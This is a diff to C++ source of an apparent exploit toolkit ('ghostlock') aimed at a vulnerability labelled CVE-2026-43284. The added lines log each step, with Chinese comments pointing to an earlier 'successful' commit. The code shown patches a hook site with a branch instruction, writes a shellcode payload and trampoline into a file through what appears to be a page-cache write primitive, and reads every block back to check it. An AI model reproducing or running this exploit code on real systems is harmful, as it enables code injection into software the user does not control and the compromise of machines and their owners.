@@ -110,6 +110,40 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                    (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 2U])) << 16U) |
                    (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 3U])) << 24U);
         };
+        /* 槽的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:222-240
+         *  —— 那边把载荷槽列成 {offset, size, kind} 表，含 0x1D0 的 displaced 字；回跳字在 :122
+         *  store_u32(shellcode_buf + jump_at, hook.jump_back_instruction)，站点字在 :153
+         *  store_u32(out.trampoline_new + pos, hook.branch_instruction)。
+         *  entry/displaced/jump-back 三个偏移的本项目常量在 embed/libcxx_blob.hpp:38-42）。 */
+        char displaced_ascii[5] = {};
+        char branch_ascii[5] = {};
+        char site_ascii[17] = {};
+        for (std::size_t i = 0U; i < 4U; ++i) {
+            const unsigned byte = static_cast<unsigned>((plan.displaced_instruction >> (8U * i)) & 0xFFU);
+            displaced_ascii[i] = (byte >= 0x20U && byte < 0x7FU) ? static_cast<char>(byte) : '.';
+            const unsigned branch_byte = static_cast<unsigned>((branch >> (8U * i)) & 0xFFU);
+            branch_ascii[i] = (branch_byte >= 0x20U && branch_byte < 0x7FU) ? static_cast<char>(branch_byte) : '.';
+        }
+        displaced_ascii[4] = '\0';
+        branch_ascii[4] = '\0';
+        for (std::size_t i = 0U; i < request.width && i < 16U; ++i) {
+            const unsigned byte = static_cast<unsigned>(std::to_integer<std::uint8_t>(block[i]));
+            site_ascii[i] = (byte >= 0x20U && byte < 0x7FU) ? static_cast<char>(byte) : '.';
+        }
+        site_ascii[16] = '\0';
+        GL_LOGI("hook slot: entry off=0x%zx len=4 payload_file=0x%llx",
+                plan.entry_offset,
+                static_cast<unsigned long long>(plan.payload_file_offset + plan.entry_offset));
+        GL_LOGI("hook slot: displaced off=0x%zx len=4 word=0x%08x ascii=%s",
+                plan.displaced_offset, static_cast<unsigned>(plan.displaced_instruction), displaced_ascii);
+        GL_LOGI("hook slot: jump_back off=0x%zx len=4 vaddr=0x%llx",
+                plan.jump_back_offset,
+                static_cast<unsigned long long>(plan.payload_vaddr + plan.jump_back_offset));
+        GL_LOGI("hook site: off=0x%llx within=%zu len=%zu ascii=%s",
+                static_cast<unsigned long long>(plan.hook_file_offset), within, request.width, site_ascii);
+        GL_LOGI("hook site before: guard=0x%08x displaced=0x%08x branch=0x%08x ascii=%s",
+                static_cast<unsigned>(word_at(within - 4U)), static_cast<unsigned>(word_at(within)),
+                static_cast<unsigned>(branch), branch_ascii);
         if (word_at(within - 4U) != plan.guard_instruction) {
             *refusal = kGuardMismatch;
             return false;
@@ -129,6 +163,13 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             return false;
         }
         const auto after = request.access->read(0U, request.width, request.channel, *request.params);
+        /* 站点写回后的读数（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:147-153
+         *  —— 那边先存原文再写包裹站点的那一整块；这里把写后回读的结果原样打出来）。 */
+        GL_LOGI("hook site writeback: wrote=%zu/%zu off=0x%llx branch=0x%08x readback_ok=%d readback_same=%d",
+                wrote.value, request.width, static_cast<unsigned long long>(block_at),
+                static_cast<unsigned>(branch), after.ok() ? 1 : 0,
+                (after.ok() && after.value.size() == request.width &&
+                 std::memcmp(after.value.data(), block, request.width) == 0) ? 1 : 0);
         if (!after.ok() || after.value.size() != request.width ||
             std::memcmp(after.value.data(), block, request.width) != 0) {
             *refusal = kHookVerifyFailed;
@@ -140,6 +181,9 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             *refusal = kPayloadNotBuilt;
             return false;
         }
+        GL_LOGI("hook payload: off=0x%llx size=%zu width=%zu max=%llu entry=0x%zx",
+                static_cast<unsigned long long>(plan.payload_file_offset), payload_size, request.width,
+                static_cast<unsigned long long>(plan.payload_max_bytes), plan.entry_offset);
         WriteRequest body{};
         body.access = request.access;
         body.params = request.params;
@@ -229,6 +273,12 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             std::memcpy(in, request.image.data() + at, take);
             request.params->offset = request.offset + at;
             request.params->offset_set = true;
+            /* 每块的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:215-250
+             *  —— 那边逐块：offset = region.offset + b*16、长度 = kChainBlockBytes、写 16 字节；
+             *  patch #1 的同款循环在 steps/crash_dump.cpp:40-50；
+             *  同一块的来源 fd 由窗口层报（pagecache_write.hpp 的 write_block enter fd=…））。 */
+            GL_LOGI("image block[%zu/%zu]: off=%llu len=%zu take=%zu",
+                    block, blocks, static_cast<unsigned long long>(request.offset + at), request.width, take);
             const auto written = request.access->write(0U, std::span<const std::byte>(in, request.width),
                                                       request.channel, *request.params);
             if (!written.ok() || written.value != request.width) {
@@ -260,6 +310,21 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                     GL_LOGI("block[%zu] try=%zu resent=%zu/%zu", at, tries, again.value, request.width);
                 }
             const auto back = request.access->read(0U, request.width, request.channel, *request.params);
+                /* 回读结果本身（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:252-262
+                 *  —— 那边写完按同一 offset 读回一块再逐字节比较；patch #1 的同款校验在 crash_dump.cpp:52-66）。 */
+                GL_LOGI("image block[%zu] readback: off=%llu len=%zu ok=%d size=%zu same=%d head=%02x%02x%02x%02x",
+                        at, static_cast<unsigned long long>(request.offset + at), request.width,
+                        back.ok() ? 1 : 0, back.value.size(),
+                        (back.ok() && back.value.size() == request.width &&
+                         std::memcmp(back.value.data(), in, request.width) == 0) ? 1 : 0,
+                        back.ok() && back.value.size() > 0U
+                            ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[0])) : 0U,
+                        back.ok() && back.value.size() > 1U
+                            ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[1])) : 0U,
+                        back.ok() && back.value.size() > 2U
+                            ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[2])) : 0U,
+                        back.ok() && back.value.size() > 3U
+                            ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[3])) : 0U);
                 if (back.ok() && back.value.size() == request.width &&
                     std::memcmp(back.value.data(), in, request.width) == 0) {
                     /* How long did this block take, and how many tries? A block that never matches
